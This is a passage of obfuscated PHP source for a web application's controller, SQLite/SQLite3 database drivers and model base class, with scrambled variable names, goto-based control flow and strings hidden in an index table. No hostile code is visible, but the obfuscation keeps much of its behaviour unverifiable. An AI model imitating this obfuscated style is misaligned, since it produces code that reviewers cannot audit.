$_SERVER[ß⁄ˆÇ†Œ]; $›¥©©Ã‘ = array($ôæ•∂öø[1755] => USER_ID, $ôæ•∂öø[565] => 0); $∏úÛ¯Ú√ = $this->where($›¥©©Ã‘)->max($ôæ•∂öø[1987]); $”ÃƒéÂ‘ = array($ôæ•∂öø[1987] => $∏úÛ¯Ú√ + 1); return $this->where($›¥©©Ã‘)->where(array($ôæ•∂öø[32] => $ƒ‹àÎÉ‡))->save($”ÃƒéÂ‘); } private function getAutoName($∞ ˛ﬁÎÀ) { $á«∞Ÿ£“ =& $_SERVER[ß⁄ˆÇ†Œ]; $¯€π–•Ù = array($á«∞Ÿ£“[1755] => USER_ID, $á«∞Ÿ£“[565] => 0); $®…ç©ù¬ = $this->field($á«∞Ÿ£“[32])->where($¯€π–•Ù)->select(); $®…ç©ù¬ = array_to_keyvalue($®…ç©ù¬, $á«∞Ÿ£“[12], $á«∞Ÿ£“[32]); if (!$®…ç©ù¬ || !in_array($∞ ˛ﬁÎÀ, $®…ç©ù¬)) { return $∞ ˛ﬁÎÀ; } for ($úúÊ•÷¸ = 0; $úúÊ•÷¸ < count($®…ç©ù¬); $úúÊ•÷¸++) { if (!in_array($∞ ˛ﬁÎÀ . "\50{$úúÊ•÷¸}\51", $®…ç©ù¬)) { return $∞ ˛ﬁÎÀ . "\x28{$úúÊ•÷¸}\51"; } } return $∞ ˛ﬁÎÀ . "\x28{$úúÊ•÷¸}\51"; } } goto EõØ°’òµ–; c‚áå‡≥°°: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÿ⁄˙»øÄ =& $_SERVER[ß⁄ˆÇ†Œ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÿ⁄˙»øÄ[6]] =& $config; $this->values[$ÿ⁄˙»øÄ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÿ⁄˙»øÄ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ô®Ü˝‚˛) { if (1 === func_num_args()) { $this->{$Ô®Ü˝‚˛} = new $Ô®Ü˝‚˛(); } else { $”ÒÁÔåË = new ReflectionClass($Ô®Ü˝‚˛); $â¶õ˚ã≈ = func_get_args(); array_shift($â¶õ˚ã≈); $this->{$Ô®Ü˝‚˛} = $”ÒÁÔåË->newInstanceArgs($â¶õ˚ã≈); } return $this->{$Ô®Ü˝‚˛}; } public function routeBind($ö£”úÑ˘, $¯ßô≤⁄ª, $Ö≥¶¸≤√ = 3) { $Â–ïªçü =& $_SERVER[ß⁄ˆÇ†Œ]; $Ô®∆›ëå = $this->in[$Â–ïªçü[9]]; $ö£”úÑ˘ = str_replace($Â–ïªçü[10], $Â–ïªçü[11], trim(trim($ö£”úÑ˘, $Â–ïªçü[8]), $Â–ïªçü[12])); if (!$ö£”úÑ˘ || count($Ô®∆›ëå) <= $Ö≥¶¸≤√) { return !1; } $ˆøî£Ì® = !0; $≈ÅÌÈÒá = explode($Â–ïªçü[8], $ö£”úÑ˘); for ($¡ñ∏›¶Ô = 0; $¡ñ∏›¶Ô < count($≈ÅÌÈÒá); $¡ñ∏›¶Ô++) { if ($≈ÅÌÈÒá[$¡ñ∏›¶Ô] != $Ô®∆›ëå[$Ö≥¶¸≤√ + $¡ñ∏›¶Ô]) { $ˆøî£Ì® = !1; break; } } if (!$ˆøî£Ì®) { return; } call_user_func_array(array($this, $¯ßô≤⁄ª), array()); } public function routeArgs($‚‹ûœ˝¬ = 3) { $ﬂÇÄœ¯ó = $this->in[$_SERVER[ß⁄ˆÇ†Œ][9]]; if (count($ﬂÇÄœ¯ó) <= $‚‹ûœ˝¬) { return array(); } $À◊è˘˙ﬁ = array(); for ($ı≈›≤ﬁÙ = $‚‹ûœ˝¬; $ı≈›≤ﬁÙ < count($ﬂÇÄœ¯ó); $ı≈›≤ﬁÙ += 2) { $À◊è˘˙ﬁ[$ﬂÇÄœ¯ó[$ı≈›≤ﬁÙ]] = $ﬂÇÄœ¯ó[$ı≈›≤ﬁÙ + 1]; $this->in[$ﬂÇÄœ¯ó[$ı≈›≤ﬁÙ]] = $ﬂÇÄœ¯ó[$ı≈›≤ﬁÙ + 1]; } return $À◊è˘˙ﬁ; } protected function assign($à™„Ÿﬂä, $™≤»†ê⁄) { $this->values[$à™„Ÿﬂä] = $™≤»†ê⁄; } protected function display($ıïµ« â) { ob_end_clean(); extract($this->values); require $this->tpl . $ıïµ« â; } } class DbSqliteBase extends Db { public function __construct($ëáœ∆¬È = '') { $˜Úﬂ≥üﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!extension_loaded($˜Úﬂ≥üﬂ[13])) { think_exception(think_lang($˜Úﬂ≥üﬂ[14]) . $˜Úﬂ≥üﬂ[15]); } if (!empty($ëáœ∆¬È)) { if (!isset($ëáœ∆¬È[$˜Úﬂ≥üﬂ[16]])) { $ëáœ∆¬È[$˜Úﬂ≥üﬂ[16]] = 438; } $this->config = $ëáœ∆¬È; if (empty($this->config[$˜Úﬂ≥üﬂ[17]])) { $this->config[$˜Úﬂ≥üﬂ[17]] = array(); } } } public function connect($˛∞Êîœã = '', $Å∆«≈—ú = 0) { $ã∞ªÊû± =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->linkID[$Å∆«≈—ú])) { if (empty($˛∞Êîœã)) { $˛∞Êîœã = $this->config; } $˛∏≈†¬è = !empty($˛∞Êîœã[$ã∞ªÊû±[17]][$ã∞ªÊû±[18]]) ? $˛∞Êîœã[$ã∞ªÊû±[17]][$ã∞ªÊû±[18]] : $this->pconnect; $∆¶‡êπç = $˛∏≈†¬è ? $ã∞ªÊû±[19] : $ã∞ªÊû±[20]; $this->linkID[$Å∆«≈—ú] = $∆¶‡êπç($˛∞Êîœã[$ã∞ªÊû±[21]], $˛∞Êîœã[$ã∞ªÊû±[16]]); if (!$this->linkID[$Å∆«≈—ú]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Å∆«≈—ú], 30000); if (1 != think_config($ã∞ªÊû±[22])) { unset($this->config); } } return $this->linkID[$Å∆«≈—ú]; } public function free() { $this->queryID = null; } public function query($Á™ì«©æ) { $πË©›¨° =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Á™ì«©æ; if ($this->queryID) { $this->free(); } think_action_status($πË©›¨°[23], 1); think_status($πË©›¨°[24]); $this->queryID = sqlite_query($this->_linkID, $Á™ì«©æ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‹§Äæí’ = $this->getAll(); return $‹§Äæí’; } } public function execute($ë’˛∆’÷) { $¶«∫ƒÏ˘ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ë’˛∆’÷; if ($this->queryID) { $this->free(); } think_action_status($¶«∫ƒÏ˘[25], 1); think_status($¶«∫ƒÏ˘[24]); $∑¢àÒæá = sqlite_exec($this->_linkID, $ë’˛∆’÷); $this->debug(); if (!1 === $∑¢àÒæá) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ß⁄ˆÇ†Œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ºÿ©è‘∏ = sqlite_query($this->_linkID, $_SERVER[ß⁄ˆÇ†Œ][27]); if (!$ºÿ©è‘∏) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $–ò·´©± = sqlite_query($this->_linkID, $_SERVER[ß⁄ˆÇ†Œ][28]); if (!$–ò·´©±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $îö⁄ê¬œ = array(); if ($this->numRows > 0) { for ($úœ¿’—ø = 0; $úœ¿’—ø < $this->numRows; $úœ¿’—ø++) { $îö⁄ê¬œ[$úœ¿’—ø] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $îö⁄ê¬œ; } public function getFields($¶õÜºÏë) { $ÒÉ∂◊±ï =& $_SERVER[ß⁄ˆÇ†Œ]; $˜°ñ˜÷‡ = $this->query($ÒÉ∂◊±ï[29] . $¶õÜºÏë . $ÒÉ∂◊±ï[30]); $∆«Ö…Í˛ = array(); if ($˜°ñ˜÷‡) { foreach ($˜°ñ˜÷‡ as $Û‹ÑÍÂ˘ => $îä∂Ãè…) { $∆«Ö…Í˛[$îä∂Ãè…[$ÒÉ∂◊±ï[31]]] = array($ÒÉ∂◊±ï[32] => $îä∂Ãè…[$ÒÉ∂◊±ï[31]], $ÒÉ∂◊±ï[33] => $îä∂Ãè…[$ÒÉ∂◊±ï[34]], $ÒÉ∂◊±ï[35] => (bool) ($îä∂Ãè…[$ÒÉ∂◊±ï[36]] === $ÒÉ∂◊±ï[12]), $ÒÉ∂◊±ï[37] => $îä∂Ãè…[$ÒÉ∂◊±ï[38]], $ÒÉ∂◊±ï[39] => strtolower($îä∂Ãè…[$ÒÉ∂◊±ï[40]]) == $ÒÉ∂◊±ï[41], $ÒÉ∂◊±ï[42] => strtolower($îä∂Ãè…[$ÒÉ∂◊±ï[43]]) == $ÒÉ∂◊±ï[44]); } } return $∆«Ö…Í˛; } public function getTables($≠Á¶Çà∞ = '') { $˛ìû´ïÂ =& $_SERVER[ß⁄ˆÇ†Œ]; $¿›ﬂΩì· = $this->query($˛ìû´ïÂ[45] . $˛ìû´ïÂ[46] . $˛ìû´ïÂ[47]); $Ö‚˙Ã‡ÿ = array(); foreach ($¿›ﬂΩì· as $√¯Û‹£∞ => $˝‰∏ò◊≈) { $Ö‚˙Ã‡ÿ[$√¯Û‹£∞] = current($˝‰∏ò◊≈); } return $Ö‚˙Ã‡ÿ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ó€˛üÖÆ =& $_SERVER[ß⁄ˆÇ†Œ]; $µòãªœ≠ = sqlite_last_error($this->_linkID); $this->error = $µòãªœ≠ . $ó€˛üÖÆ[4] . sqlite_error_string($µòãªœ≠); if ($ó€˛üÖÆ[12] != $this->queryStr) { $this->error .= LNG($ó€˛üÖÆ[48]) . $this->queryStr; } think_trace($this->error, $ó€˛üÖÆ[12], $ó€˛üÖÆ[49]); return $this->error; } public function escapeString($ŸÒÑ”Õ˚) { return sqlite_escape_string($ŸÒÑ”Õ˚); } public function parseLimit($ò£ßÿŸÚ) { $é„’ ˝´ =& $_SERVER[ß⁄ˆÇ†Œ]; $¥ƒ≈≈Œ¸ = $é„’ ˝´[12]; if (!empty($ò£ßÿŸÚ)) { $ò£ßÿŸÚ = explode($é„’ ˝´[50], $ò£ßÿŸÚ); if (count($ò£ßÿŸÚ) > 1) { $¥ƒ≈≈Œ¸ .= $é„’ ˝´[51] . $ò£ßÿŸÚ[1] . $é„’ ˝´[52] . $ò£ßÿŸÚ[0] . $é„’ ˝´[53]; } else { $¥ƒ≈≈Œ¸ .= $é„’ ˝´[51] . $ò£ßÿŸÚ[0] . $é„’ ˝´[53]; } } return $¥ƒ≈≈Œ¸; } } class DbSqlite3Base extends Db { public function __construct($’îúÌ«£ = '') { $õπÓí‰˚ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!class_exists($õπÓí‰˚[54])) { think_exception(think_lang($õπÓí‰˚[14]) . $õπÓí‰˚[55]); } if (!empty($’îúÌ«£)) { if (!isset($’îúÌ«£[$õπÓí‰˚[16]])) { $’îúÌ«£[$õπÓí‰˚[16]] = 438; } $this->config = $’îúÌ«£; if (empty($this->config[$õπÓí‰˚[17]])) { $this->config[$õπÓí‰˚[17]] = array(); } } } public function connect($‘ßÒÖÃ— = '', $˛©ÕÂÙ = 0) { $÷´âç©Õ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($this->linkID[$˛©ÕÂÙ])) { if (empty($‘ßÒÖÃ—)) { $‘ßÒÖÃ— = $this->config; } $this->linkID[$˛©ÕÂÙ] = new SQLite3($‘ßÒÖÃ—[$÷´âç©Õ[21]]); if (!$this->linkID[$˛©ÕÂÙ]) { think_exception($this->linkID[$˛©ÕÂÙ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$˛©ÕÂÙ]->busyTimeout(30000); if (1 != think_config($÷´âç©Õ[22])) { unset($this->config); } } return $this->linkID[$˛©ÕÂÙ]; } public function free() { $this->queryID = null; } public function query($∞∂‰¸Ú∑) { $»ÌöÏˆæ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $∞∂‰¸Ú∑; if ($this->queryID) { $this->free(); } think_action_status($»ÌöÏˆæ[23], 1); think_status($»ÌöÏˆæ[24]); $this->queryID = $this->_linkID->query($∞∂‰¸Ú∑); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $õ±îÑ¯ó = $this->getAll(); $this->numRows = count($õ±îÑ¯ó); return $õ±îÑ¯ó; } } public function execute($ˆŸ˜∏¢ü) { $˜öº€‡Ü =& $_SERVER[ß⁄ˆÇ†Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ˆŸ˜∏¢ü; if ($this->queryID) { $this->free(); } think_action_status($˜öº€‡Ü[25], 1); think_status($˜öº€‡Ü[24]); $ƒáËÒ∏¯ = $this->_linkID->exec($ˆŸ˜∏¢ü); $this->debug(); if (!1 === $ƒáËÒ∏¯) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ß⁄ˆÇ†Œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $µó“±êä = $this->_linkID->query($_SERVER[ß⁄ˆÇ†Œ][27]); if (!$µó“±êä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÚØ‡®Êû = $this->_linkID->query($_SERVER[ß⁄ˆÇ†Œ][28]); if (!$ÚØ‡®Êû) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $™¶≥ùÇã = array(); while ($Å∏˜›¢… = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $™¶≥ùÇã[] = $Å∏˜›¢…; } $this->queryID->reset(); return $™¶≥ùÇã; } public function getFields($Ú•‘ú¸ ) { $î¶È≈É =& $_SERVER[ß⁄ˆÇ†Œ]; $ûŒ†ÌŒ√ = $this->query($î¶È≈É[29] . $Ú•‘ú¸  . $î¶È≈É[30]); $Ó⁄Èµ÷ = array(); if ($ûŒ†ÌŒ√) { foreach ($ûŒ†ÌŒ√ as $¯áâ◊ò© => $ä ≤é‘) { $Ó⁄Èµ÷[$ä ≤é‘[$î¶È≈É[32]]] = array($î¶È≈É[32] => $ä ≤é‘[$î¶È≈É[32]], $î¶È≈É[33] => $ä ≤é‘[$î¶È≈É[33]], $î¶È≈É[35] => (bool) ($ä ≤é‘[$î¶È≈É[35]] === $î¶È≈É[12]), $î¶È≈É[37] => $ä ≤é‘[$î¶È≈É[56]], $î¶È≈É[39] => (bool) $ä ≤é‘[$î¶È≈É[57]], $î¶È≈É[42] => (bool) $ä ≤é‘[$î¶È≈É[57]]); } } return $Ó⁄Èµ÷; } public function getTables($ù°Ëú£˘ = '') { $Á¶Æ©í˛ =& $_SERVER[ß⁄ˆÇ†Œ]; $îƒÁÊòª = $this->query($Á¶Æ©í˛[45] . $Á¶Æ©í˛[46] . $Á¶Æ©í˛[47]); $°Á‹Û˘à = array(); foreach ($îƒÁÊòª as $ﬂﬂªµóÅ => $¥º∆Ç˚≈) { $°Á‹Û˘à[$ﬂﬂªµóÅ] = current($¥º∆Ç˚≈); } return $°Á‹Û˘à; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¯¯äÈ≈ä =& $_SERVER[ß⁄ˆÇ†Œ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¯¯äÈ≈ä[12] != $this->queryStr) { $this->error .= LNG($¯¯äÈ≈ä[48]) . $this->queryStr; } think_trace($this->error, $¯¯äÈ≈ä[12], $¯¯äÈ≈ä[49]); return $this->error; } public function escapeString($“ÜïπŸÜ) { $¨£™“…˚ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->_linkID) { return $this->_linkID->escapeString($“ÜïπŸÜ); } return str_ireplace($¨£™“…˚[58], $¨£™“…˚[59], $“ÜïπŸÜ); } public function parseLimit($Ü˝û•ù∑) { $Ëπ∑¥“ç =& $_SERVER[ß⁄ˆÇ†Œ]; $˚ªéßˆõ = $Ëπ∑¥“ç[12]; if (!empty($Ü˝û•ù∑)) { $Ü˝û•ù∑ = explode($Ëπ∑¥“ç[50], $Ü˝û•ù∑); if (count($Ü˝û•ù∑) > 1) { $˚ªéßˆõ .= $Ëπ∑¥“ç[51] . $Ü˝û•ù∑[1] . $Ëπ∑¥“ç[52] . $Ü˝û•ù∑[0] . $Ëπ∑¥“ç[53]; } else { $˚ªéßˆõ .= $Ëπ∑¥“ç[51] . $Ü˝û•ù∑[0] . $Ëπ∑¥“ç[53]; } } return $˚ªéßˆõ; } } goto C”Üìü”°Ô; d©∂¡Ÿ∑≈Ÿ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\x69\x6d\145", "\164\x69\155\145", "\151\x6e\x73\x65\x72\164\54\165\160\x64\141\x74\145", "\x66\x75\156\x63\x74\x69\x6f\156"), array("\143\162\145\x61\x74\145\x54\151\155\x65", "\x74\151\155\145", "\151\156\163\145\162\x74", "\146\x75\x6e\143\164\151\157\x6e")); public function setDataAuto($ÏΩÛ‚ßì) { $this->dataAuto = $ÏΩÛ‚ßì; } public function __construct($ËÿâßÑ… = '', $Âœ‚¯ˆÀ = '', $ﬁ¨”’Í— = '') { parent::__construct($ËÿâßÑ…, $Âœ‚¯ˆÀ, $ﬁ¨”’Í—); } protected $tableMeta = array(); protected function _beforeInsert(&$™òò’µ⁄, $∆™øı‚∞) { $ÒﬂÃº‰ı =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->checkDataAutoHas($ÒﬂÃº‰ı[440])) { return; } $this->dataBeforeFilter($™òò’µ⁄, $ÒﬂÃº‰ı[440]); } protected function _beforeUpdate(&$¬–Ï˜Æ∆, $á€îãÒ…) { $ıàÒ˙£ß =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->checkDataAutoHas($ıàÒ˙£ß[441])) { return; } $this->dataBeforeFilter($¬–Ï˜Æ∆, $ıàÒ˙£ß[441]); } protected function _afterSelect(&$ë˛¸É—Ì, $°∑£òùä) { if (!is_array($ë˛¸É—Ì)) { return; } if (!$this->checkDataAutoHas($_SERVER[ß⁄ˆÇ†Œ][442])) { return; } foreach ($ë˛¸É—Ì as &$ç—∂óÓ…) { $this->dataAfterFilter($ç—∂óÓ…); } unset($ç—∂óÓ…); } protected function _afterFind(&$˘ﬁ≠ºÓ˜, $˘“¢¬úí) { if (!is_array($˘ﬁ≠ºÓ˜)) { return; } if (!$this->checkDataAutoHas($_SERVER[ß⁄ˆÇ†Œ][442])) { return; } $this->dataAfterFilter($˘ﬁ≠ºÓ˜); } public static function textEncode($øÒœ‡ë¿) { if (!$øÒœ‡ë¿) { return $øÒœ‡ë¿; } $ÿóÙ†ùŸ = json_encode($øÒœ‡ë¿); $ÿóÙ†ùŸ = preg_replace_callback($_SERVER[ß⁄ˆÇ†Œ][443], function ($ üÓùâÊ) { return addslashes($ üÓùâÊ[0]); }, $ÿóÙ†ùŸ); return json_decode($ÿóÙ†ùŸ); } public static function textDecode($ÿò–¡⁄™) { $±É◊ó ˙ =& $_SERVER[ß⁄ˆÇ†Œ]; $›Å∏àœ¨ = json_encode($ÿò–¡⁄™); $›Å∏àœ¨ = preg_replace_callback($±É◊ó ˙[444], function ($Üù‹—´”) { return $_SERVER[ß⁄ˆÇ†Œ][100]; }, $›Å∏àœ¨); return json_decode($›Å∏àœ¨); } public function setAutoIncrement($ƒ´ÅôùØ) { $¶÷˘…˘‹ = array($this->getPk() => $ƒ´ÅôùØ); $ëª’“•û = $this->data($¶÷˘…˘‹)->add(); if ($ëª’“•û) { $this->delete($ëª’“•û); } } public function getAutoIncrement() { $™°≤Ôæ = $this->getTableName(); $˙°ÄÒ∆π = $this->max($this->getPk()); $•Å≈⁄¬¿ = $this->query("\x73\150\157\167\40\164\x61\x62\154\x65\40\163\164\x61\164\165\x73\x20\167\150\x65\162\x65\x20\x4e\141\x6d\x65\x3d\x27{$™°≤Ôæ}\x27"); $ÇÉµµÁ∏ = $•Å≈⁄¬¿[0][$_SERVER[ß⁄ˆÇ†Œ][445]]; $⁄Ñ≈ÎµÃ = max($˙°ÄÒ∆π, $ÇÉµµÁ∏); return $⁄Ñ≈ÎµÃ; } protected function _callBefore($øå∑’ÿ€, $∞óå∏Â∆) { return $this->cacheCallCheck($øå∑’ÿ€, $∞óå∏Â∆, !1); } protected function _callAfter($ÓúàìÁÆ, $ÿ≤ß»Ñﬂ) { return $this->cacheCallCheck($ÓúàìÁÆ, $ÿ≤ß»Ñﬂ, !0); } protected function cacheFunctionAlias($ŒªÂÑ†Ó) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¬ÖŸáπè, $å≥˛°ÜÁ, $Ñªù™±ò = false) { $∑π≠∫øõ = $this->cacheFunctionAlias($å≥˛°ÜÁ); if (!$∑π≠∫øõ) { return; } foreach ($∑π≠∫øõ as $íÌÃ∫Ö¿ => $åü˘åÑí) { $ùÌÙø¯¶ = $åü˘åÑí[0]; $ç≈Ø±ÄÀ = explode($_SERVER[ß⁄ˆÇ†Œ][50], $åü˘åÑí[1]); if ($¬ÖŸáπè == $íÌÃ∫Ö¿) { return $this->cacheFunctionGet($íÌÃ∫Ö¿, $ùÌÙø¯¶); } if ($Ñªù™±ò && in_array($¬ÖŸáπè, $ç≈Ø±ÄÀ)) { $this->cacheFunctionClear($íÌÃ∫Ö¿, $ùÌÙø¯¶); } } } public function cacheFunctionGet($¯ü‰‰çö, $¢˜ ôõÈ) { $å”ÒßêŒ = $this->cacheKeyMake($¯ü‰‰çö, $¢˜ ôõÈ); $Ω–®ÌÔƒ = Cache::get($å”ÒßêŒ); if (!is_array($Ω–®ÌÔƒ)) { $Ω–®ÌÔƒ = call_user_func_array(array($this, $¯ü‰‰çö), array($¢˜ ôõÈ, !0)); Cache::set($å”ÒßêŒ, $Ω–®ÌÔƒ); } return $Ω–®ÌÔƒ; } public function cacheFunctionClear($ø‘ﬂ«πº, $’±Öœ∑±) { $º£ûÀÂ¢ = $’±Öœ∑±; if (!is_array($’±Öœ∑±)) { $º£ûÀÂ¢ = array($’±Öœ∑±); } foreach ($º£ûÀÂ¢ as $ó«ûÅΩÍ) { $õıƒ≥Ä— = $this->cacheKeyMake($ø‘ﬂ«πº, $ó«ûÅΩÍ); Cache::remove($õıƒ≥Ä—); } } private function cacheKeyMake($ò‚Ò‰∂Ä, $”·˛ç«ø) { $£∫ÀÖ˚° =& $_SERVER[ß⁄ˆÇ†Œ]; return get_class($this) . $£∫ÀÖ˚°[11] . $ò‚Ò‰∂Ä . $£∫ÀÖ˚°[446] . $”·˛ç«ø; } protected function selectPageReset() { $∏úëñ≥¬ =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($GLOBALS[$∏úëñ≥¬[447]])) { return; } $GLOBALS[$∏úëñ≥¬[447]] = isset($GLOBALS[$∏úëñ≥¬[7]][$∏úëñ≥¬[448]]) ? $GLOBALS[$∏úëñ≥¬[7]][$∏úëñ≥¬[448]] : !1; $GLOBALS[$∏úëñ≥¬[449]] = isset($GLOBALS[$∏úëñ≥¬[7]][$∏úëñ≥¬[438]]) ? $GLOBALS[$∏úëñ≥¬[7]][$∏úëñ≥¬[438]] : !1; $GLOBALS[$∏úëñ≥¬[7]][$∏úëñ≥¬[448]] = !1; $GLOBALS[$∏úëñ≥¬[7]][$∏úëñ≥¬[438]] = !1; } protected function selectPageRestore() { $¶Ô†Ë√§ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($GLOBALS[$¶Ô†Ë√§[447]])) { return; } $GLOBALS[$¶Ô†Ë√§[7]][$¶Ô†Ë√§[448]] = $GLOBALS[$¶Ô†Ë√§[447]]; $GLOBALS[$¶Ô†Ë√§[7]][$¶Ô†Ë√§[438]] = $GLOBALS[$¶Ô†Ë√§[449]]; if ($GLOBALS[$¶Ô†Ë√§[7]][$¶Ô†Ë√§[448]] === !1) { unset($GLOBALS[$¶Ô†Ë√§[7]][$¶Ô†Ë√§[448]]); } if ($GLOBALS[$¶Ô†Ë√§[7]][$¶Ô†Ë√§[438]] === !1) { unset($GLOBALS[$¶Ô†Ë√§[7]][$¶Ô†Ë√§[438]]); } unset($GLOBALS[$¶Ô†Ë√§[447]]); unset($GLOBALS[$¶Ô†Ë√§[449]]); } protected function selectPage($Áœì¢‘õ = 200, $˛ã≠˛±Á = 1) { $ØÚä◊˛¿ =& $_SERVER[ß⁄ˆÇ†Œ]; global $in; $®≠Å∑∆õ = $this->optionsValue(); $‚´‚º§∞ = 50000; $Áœì¢‘õ = isset($in[$ØÚä◊˛¿[448]]) && $in[$ØÚä◊˛¿[448]] ? $in[$ØÚä◊˛¿[448]] : $Áœì¢‘õ; if ($Áœì¢‘õ === -1) { $in[$ØÚä◊˛¿[448]] = !1; $‚´‚º§∞ = 100000000; $Áœì¢‘õ = $‚´‚º§∞; } $Ò∏íáê“ = $®≠Å∑∆õ; $Ò∏íáê“[$ØÚä◊˛¿[450]] = array(); $Áœì¢‘õ = intval($Áœì¢‘õ); $Áœì¢‘õ = $Áœì¢‘õ <= 5 ? 5 : ($Áœì¢‘õ >= $‚´‚º§∞ ? $‚´‚º§∞ : $Áœì¢‘õ); $˛ã≠˛±Á = intval(isset($in[$ØÚä◊˛¿[438]]) && $in[$ØÚä◊˛¿[438]] ? $in[$ØÚä◊˛¿[438]] : $˛ã≠˛±Á); $˛ã≠˛±Á = $˛ã≠˛±Á <= 1 ? 1 : $˛ã≠˛±Á; $»ŸÿÃÉç = array(); $—àËÆƒ∫ = 1; if ($˛ã≠˛±Á == 1 && $—àËÆƒ∫) { $this->optionsValue($®≠Å∑∆õ); $»ŸÿÃÉç = $this->page($˛ã≠˛±Á, $Áœì¢‘õ)->select(); $ﬂ•Œ‚ŒÉ = is_array($»ŸÿÃÉç) ? count($»ŸÿÃÉç) : 0; if ($ﬂ•Œ‚ŒÉ < $Áœì¢‘õ) { $˚éèßå¥ = 1; } else { $this->optionsValue($Ò∏íáê“); $ﬂ•Œ‚ŒÉ = intval($this->count()); $˚éèßå¥ = ceil($ﬂ•Œ‚ŒÉ / $Áœì¢‘õ); } } else { $this->optionsValue($Ò∏íáê“); $ﬂ•Œ‚ŒÉ = intval($this->count()); $˚éèßå¥ = ceil($ﬂ•Œ‚ŒÉ / $Áœì¢‘õ); $˛ã≠˛±Á = $˛ã≠˛±Á >= $˚éèßå¥ ? $˚éèßå¥ : $˛ã≠˛±Á; $this->optionsValue($®≠Å∑∆õ); $»ŸÿÃÉç = $this->page($˛ã≠˛±Á, $Áœì¢‘õ)->select(); } if (!is_array($»ŸÿÃÉç)) { $»ŸÿÃÉç = array(); } if ($˚éèßå¥ == 1) { $ﬂ•Œ‚ŒÉ = count($»ŸÿÃÉç); } $∏›†˚ì∆ = array($ØÚä◊˛¿[451] => array($ØÚä◊˛¿[452] => $ﬂ•Œ‚ŒÉ, $ØÚä◊˛¿[448] => $Áœì¢‘õ, $ØÚä◊˛¿[438] => $˛ã≠˛±Á, $ØÚä◊˛¿[453] => $˚éèßå¥), $ØÚä◊˛¿[454] => $»ŸÿÃÉç); return $∏›†˚ì∆; } protected function checkLength($ûê©ù√ë, $´‹÷ç´¯ = 0, $…øÒòﬁ≥ = '') { $Ì°¶Å¥¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $´‹÷ç´¯ = $´‹÷ç´¯ ? $´‹÷ç´¯ : 65536; if (!$ûê©ù√ë || strlen($ûê©ù√ë) < $´‹÷ç´¯) { return; } $…øÒòﬁ≥ = $…øÒòﬁ≥ ? $…øÒòﬁ≥ . $Ì°¶Å¥¸[74] : $Ì°¶Å¥¸[12]; show_json($…øÒòﬁ≥ . LNG($Ì°¶Å¥¸[455]) . "\50{$´‹÷ç´¯}\x29", !1); } protected function metaSet($ÔƒÌË÷…, $ßœ∂∑‘æ = null, $Íçﬁø§ = null) { $∂çÀŸ—ó =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->tableMeta || !$ÔƒÌË÷…) { return !1; } $•ÆóÚ∑Ø = $this->tableMeta[$∂çÀŸ—ó[456]]; $≤ÍÛïâ¥ = $this->tableMeta[$∂çÀŸ—ó[457]]; $Ìãæ‹–„ = Model($≤ÍÛïâ¥); $≠º˝ﬂ˚™ = array($•ÆóÚ∑Ø => $ÔƒÌË÷…, $∂çÀŸ—ó[458] => $ßœ∂∑‘æ); if (is_null($ßœ∂∑‘æ)) { return $Ìãæ‹–„->where(array($•ÆóÚ∑Ø => $ÔƒÌË÷…))->delete(); } if (is_null($Íçﬁø§) && is_string($ßœ∂∑‘æ)) { return $Ìãæ‹–„->where($≠º˝ﬂ˚™)->delete(); } $‘íˆâ¶… = is_array($ßœ∂∑‘æ) ? $ßœ∂∑‘æ : array(); 